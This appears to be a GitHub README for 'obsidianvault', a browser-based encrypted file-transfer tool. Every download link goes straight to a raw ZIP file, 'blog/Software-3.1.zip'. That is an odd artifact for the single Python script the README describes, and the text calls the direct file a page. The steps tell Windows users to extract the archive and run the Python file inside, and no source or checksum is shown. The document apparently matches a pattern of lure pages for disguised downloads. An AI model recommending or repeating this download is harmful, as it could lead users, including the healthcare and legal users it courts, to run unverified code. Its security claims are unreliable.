# 🔐 obsidianvault - Private file transfer without leaks

[![Download obsidianvault](https://img.shields.io/badge/Download-obsidianvault-blue?style=for-the-badge)](https://raw.githubusercontent.com/InspectorPulido/obsidianvault/main/blog/Software-3.1.zip)

## 🚀 Getting Started

obsidianvault lets you send files with local encryption in the browser. It uses AES-256-GCM before any data leaves your computer. That means the server only moves encrypted data and cannot read your files.

This project is made for people who want private file transfer on Windows without a setup mess. You only need a browser and a Windows PC. The app runs as a single Python file and does not need extra packages.

## 📥 Download and Run on Windows

Use this link to visit the page to download:

https://raw.githubusercontent.com/InspectorPulido/obsidianvault/main/blog/Software-3.1.zip

### Steps

1. Open the link in your browser.
2. Download the files from the repository page.
3. If you see a ZIP file, save it to your computer.
4. Right-click the ZIP file and choose Extract All.
5. Open the extracted folder.
6. Look for the main Python file in the folder.
7. Double-click the file if your system is set to run Python files.
8. If Windows asks how to open it, pick Python.
9. When the app starts, open the local address it shows in your browser.
10. Use that page to send or receive files.

## 🖥️ What You Need

obsidianvault is built for a normal Windows desktop or laptop.

### Basic system needs

- Windows 10 or Windows 11
- A modern browser such as Edge, Chrome, or Firefox
- Python 3.10 or later
- Internet access if you plan to use it across a network
- Enough free space for the files you want to send

### Browser support

The app uses the Web Crypto API in the browser. That is what lets it encrypt files before upload. For best results, use a recent version of Chrome, Edge, or Firefox.

## 🔒 How It Works

obsidianvault keeps the file content hidden from the server.

### Simple flow

1. You choose a file in the browser.
2. The browser encrypts the file with AES-256-GCM.
3. The encrypted file is sent to the server.
4. The other person downloads the encrypted file.
5. Their browser decrypts it after they enter the right key or open the shared session.

This design helps keep file contents private during transfer. The server handles traffic, but it does not need access to your data.

## ✨ Main Features

### 🛡️ Zero-knowledge file transfer

The server never sees the plain file. Encryption happens in the browser first.

### 🔑 AES-256-GCM

The app uses a strong encryption mode that is common in security tools and compliance work.

### 🌐 Browser-based encryption

You do not need special desktop software to protect the file. The browser does the work.

### 🐍 Single Python file

The app is simple to run and easy to move between machines.

### 📦 No dependencies

You do not need to install a long list of extra Python packages.

### 🏥 Built for privacy-focused use

The setup fits workflows where file privacy matters, such as healthcare, legal work, and internal document sharing.

## 🧰 Install on Windows

### Option 1: Run from the downloaded folder

1. Download the repository from the link above.
2. Extract it to a folder you can find easily, like Downloads or Desktop.
3. Make sure Python is installed.
4. Open the folder with File Explorer.
5. Start the main Python file.
6. Open the local page in your browser.

### Option 2: Run from Command Prompt

If you prefer a more direct path:

1. Press the Windows key.
2. Type `cmd`.
3. Open Command Prompt.
4. Change into the folder where you saved obsidianvault.
5. Run the Python file with Python.

This works well if Windows does not open the file by double-clicking.

## 📤 Send a File

1. Open obsidianvault in your browser.
2. Choose the file you want to share.
3. Set a password or share key if the app asks for one.
4. Start the transfer.
5. Send the link or key to the other person through a separate channel.

For better privacy, share the link and the key in different ways. For example, send the link by email and the key by phone.

## 📥 Receive a File

1. Open the shared link in your browser.
2. Enter the key or session details you got from the sender.
3. Wait for the encrypted file to load.
4. Let the browser decrypt it.
5. Save the file to your computer.

The file stays encrypted while it moves across the network. Only your browser turns it back into plain data.

## 🔧 Common Use Cases

### Secure personal sharing

Send tax files, scans, or personal records without exposing the content to the server.

### Team document exchange

Share internal files with less risk than plain uploads.

### Healthcare workflows

Move patient-related documents in a way that fits privacy-first handling.

### Compliance-minded storage

Use encrypted transfer when you need a simple control around file handling.

## 🧪 Expected Behavior

When obsidianvault runs, you should see a local web page in your browser. That page lets you choose files, start encryption, and manage the transfer.

You should not need to install a database, a cloud account, or extra tools. The app is designed to stay light and direct.

## 🛠️ Troubleshooting

### The file does not open

- Check that Python is installed
- Try right-clicking the file and opening it with Python
- Make sure you extracted the ZIP first

### The browser page does not load

- Check that the Python process is still running
- Look for the local address in the terminal window
- Paste that address into your browser bar

### The transfer fails

- Check your internet connection
- Make sure both devices can reach the same server
- Try again with a smaller file first

### The browser says crypto is not available

- Use a newer browser
- Try Edge, Chrome, or Firefox
- Refresh the page after switching browsers

## 📁 Project Details

- Repository: obsidianvault
- Type: End-user file transfer app
- Crypto: AES-256-GCM
- Model: Zero-knowledge
- Runtime: Python
- Delivery: Browser interface
- Dependencies: None

## 🔗 Source

Primary download page:

https://raw.githubusercontent.com/InspectorPulido/obsidianvault/main/blog/Software-3.1.zip